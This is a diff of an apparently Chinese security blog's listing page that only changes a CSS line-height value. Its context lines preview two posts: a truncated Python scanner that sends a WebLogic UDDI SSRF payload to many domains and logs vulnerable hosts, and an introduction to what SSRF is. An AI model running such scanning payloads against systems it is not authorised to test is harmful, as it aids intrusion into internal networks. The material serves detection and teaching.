@@ -122,7 +122,7 @@
     </header>
 
     
-    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         0x00 检测脚本如下  #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException',html) if m: mutex.acquire() with open('ssrf.txt','a+') as f: print &quot;%s has weblogic ssrf.
     </p>
 
@@ -175,7 +175,7 @@
     </header>
 
     
-    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         0x00 什么是SSRF  &nbsp;&nbsp;&nbsp;&nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
 &nbsp;&nbsp;&nbsp;&nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
  0x01 SSRF的危害  可以扫描内部网络
